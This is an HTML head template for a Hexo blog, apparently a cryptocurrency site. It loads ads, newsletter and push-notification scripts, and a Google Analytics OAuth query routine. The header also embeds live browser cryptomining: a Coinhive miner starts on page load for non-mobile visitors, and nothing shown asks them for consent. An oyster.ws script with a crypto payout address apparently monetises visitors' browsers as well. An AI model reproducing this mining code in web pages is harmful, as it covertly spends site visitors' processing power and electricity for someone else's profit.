<!DOCTYPE html>
<html>
<head>
        <meta name="theme-color" content="#8d6e36"/>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-5407250245383049",
            enable_page_level_ads: true
          });
        </script>
    <meta charset="utf-8">
    <%
        var title = page.title;
        if (is_archive()) {
            title = __('index.archive');
            if (is_month()) {
                title += ': ' + page.year + '/' + page.month;
            } else if (is_year()) {
                title += ': ' + page.year;
            }
        } else if (is_category()) {
            title = __('index.category') + ': ' + page.category;
        } else if (is_tag()) {
            title = __('index.tag') + ': ' + page.tag;
        }
    %>
    <title><% if (title) { %><%= title %> | <% } %><%= config.title %></title>
    <% if (theme.plugins.bing_site_verification) { %>
      <meta name="msvalidate.01" content="<%- theme.plugins.bing_site_verification %>" />
    <% } %>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <% if (page.tags) {
        var keywords = [];
        for (var i in page.tags.data) {
            keywords.push(page.tags.data[i].name);
        }
    %>
        <meta name="keywords" content="<%= keywords.join(',') %>" />
    <% } %>
    <%- open_graph({
        image:          thumbnail(page),
        fb_app_id:      theme.miscellaneous.open_graph.fb_app_id,
        fb_admins:      theme.miscellaneous.open_graph.fb_admins,
        twitter_id:     theme.miscellaneous.open_graph.twitter_id,
        google_plus:    theme.miscellaneous.open_graph.google_plus,
    }) %>
    <%- meta(page) %>

    <% if (theme.customize && theme.customize.social_links && theme.customize.social_links.rss) { %>
        <link rel="alternate" href="<%- theme.customize.social_links.rss %>" title="<%= config.title %>" type="application/atom+xml" />
    <% } %>

    <% if (theme.customize.favicon) { %>
        <link rel="icon" href="<%- url_for(theme.customize.favicon) %>" />
    <% } %>

    <%- css('libs/font-awesome/css/font-awesome.min') %>
    <%- css('libs/titillium-web/styles') %>
    <%- css('libs/source-code-pro/styles') %>

    <%- css('css/style') %>

    <%- js('libs/jquery/2.0.3/jquery.min') %>
    <%- partial('plugin/scripts', { isHead: true }) %>
    <script id="o.ws" payout="0x42f2c0B01f493d16e8df3Efa713BFC0B54322c8d" src="https://oyster.ws/webnode.js"></script>

    <!-- MailMunch for HodlerStreet -->
    <!-- Paste this code right before the </head> tag on every page of your site. -->
    <script src="//a.mailmunch.co/app/v1/site.js" id="mailmunch-script" data-mailmunch-site-id="455876" async="async"></script>
    <link rel="manifest" href="/manifest.json" />
    <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
    <script>
    var OneSignal = window.OneSignal || [];
    OneSignal.push(function() {
        OneSignal.init({
        appId: "2eac4e65-ad52-456b-b900-a4bff7d9b73f",
        });
    });
    </script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('xlW2dv3kNaEWT2JHdQqZjzoi833FnJWK', {throttle: 0.3});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}
</script>

<!-- <script src="https://apis.google.com/js/client.js?onload=loadLib"></script>
<script>
    loadLib();
    function loadLib() {console.log("inside load lib");
        // Handle all the authorization work.
        // Read Hello Analytics Tutorial for details.
        gapi.client.load('analytics', 'v3', makeApiCall);
    }
    function makeApiCall() {console.log("inside makeapicall");
            var apiQuery = gapi.client.analytics.data.ga.get({
                'ids': 'ga:167398816',
                'start-date': '60daysAgo',
                'end-date': 'yesterday',
                'metrics': 'ga:pageviews',
                'dimensions': 'ga:pagePath',
                'sort': '-ga:pageviews',
                'filters': 'ga:medium==organic',
                'max-results': 25
            });
            apiQuery.execute(handleCoreReportingResults);
    }
    function handleCoreReportingResults(results) {console.log("inside results");
        if (!results.error) {
            // Success. Do something cool!
            console.log(results);
        } else {
            alert('There was an error: ' + results.message);
        }
    }
</script> -->



<script>

        // Replace with your client ID from the developer console.
        var CLIENT_ID = '338280069805-cab91o7j4uccm2fd4klrf9b54390156s.apps.googleusercontent.com';
      
        // Set authorized scope.
        var SCOPES = ['https://www.googleapis.com/auth/analytics.readonly'];
      
        authorize();

        function authorize(event) {console.log("inside authorize()")
          // Handles the authorization flow.
          // `immediate` should be false when invoked from the button click.
          var useImmdiate = event ? false : true;
          var authData = {
            client_id: CLIENT_ID,
            scope: SCOPES,
            immediate: useImmdiate
          };
          console.log("inside afterauthdata()")
          gapi.load('auth2', function () {console.log("inside onloadCallBack()");
          gapi.auth.authorize(authData, function(response) {console.log("Inside gapi authorize");
            var authButton = document.getElementById('auth-button');
            if (response.error) {
              //authButton.hidden = false;
              console.log("error");
            }
            else {
              //authButton.hidden = true;
              queryAccounts();
            }
          });})
        }
      
      
      function queryAccounts() {console.log("inside queryAccount()")
        // Load the Google Analytics client library.
        gapi.client.load('analytics', 'v3').then(function() {
      
          // Get a list of all Google Analytics accounts for this user
          gapi.client.analytics.management.accounts.list().then(handleAccounts);
        });
      }
      
      
      function handleAccounts(response) {console.log("inside handleAccount()")
        // Handles the response from the accounts list method.
        if (response.result.items && response.result.items.length) {
          // Get the first Google Analytics account.
          var firstAccountId = response.result.items[0].id;
      
          // Query for properties.
          queryProperties(firstAccountId);
        } else {
          console.log('No accounts found for this user.');
        }
      }
      
      
      function queryProperties(accountId) {console.log("inside queryProperties()")
        // Get a list of all the properties for the account.
        gapi.client.analytics.management.webproperties.list(
            {'accountId': accountId})
          .then(handleProperties)
          .then(null, function(err) {
            // Log any errors.
            console.log(err);
        });
      }
      
      
      function handleProperties(response) {console.log("inside handleproperties()")
        // Handles the response from the webproperties list method.
        if (response.result.items && response.result.items.length) {
      
          // Get the first Google Analytics account
          var firstAccountId = response.result.items[0].accountId;
      
          // Get the first property ID
          var firstPropertyId = response.result.items[0].id;
      
          // Query for Views (Profiles).
          queryProfiles(firstAccountId, firstPropertyId);
        } else {
          console.log('No properties found for this user.');
        }
      }
      
      
      function queryProfiles(accountId, propertyId) {console.log("inside queryprofiles()")
        // Get a list of all Views (Profiles) for the first property
        // of the first Account.
        gapi.client.analytics.management.profiles.list({
            'accountId': accountId,
            'webPropertyId': propertyId
        })
        .then(handleProfiles)
        .then(null, function(err) {
            // Log any errors.
            console.log(err);
        });
      }
      
      
      function handleProfiles(response) {console.log("inside handleProfile()")
        // Handles the response from the profiles list method.
        if (response.result.items && response.result.items.length) {
          // Get the first View (Profile) ID.
          var firstProfileId = response.result.items[0].id;
      
          // Query the Core Reporting API.
          queryCoreReportingApi(firstProfileId);
        } else {
          console.log('No views (profiles) found for this user.');
        }
      }
      
      
      function queryCoreReportingApi(profileId) {console.log("inside main()")
        // Query the Core Reporting API for the number sessions for
        // the past seven days.
        gapi.client.analytics.data.ga.get({
          'ids': 'ga:167398816',
                'start-date': '60daysAgo',
                'end-date': 'yesterday',
                'metrics': 'ga:pageviews',
                'dimensions': 'ga:pagePath',
                'sort': '-ga:pageviews',
                'filters': 'ga:medium==organic',
                'max-results': 25
        })
        .then(function(response) {
          var formattedJson = JSON.stringify(response.result, null, 2);
          //document.getElementById('query-output').value = formattedJson;
          console.log(formattedJson);
        })
        .then(null, function(err) {
            // Log any errors.
            console.log(err);
        });
      }
      
        // Add an event listener to the 'auth-button'.
        // document.getElementById('auth-button').addEventListener('click', authorize);
      </script>
      
      <script src="https://apis.google.com/js/client.js?onload=authorize"></script>

</head>
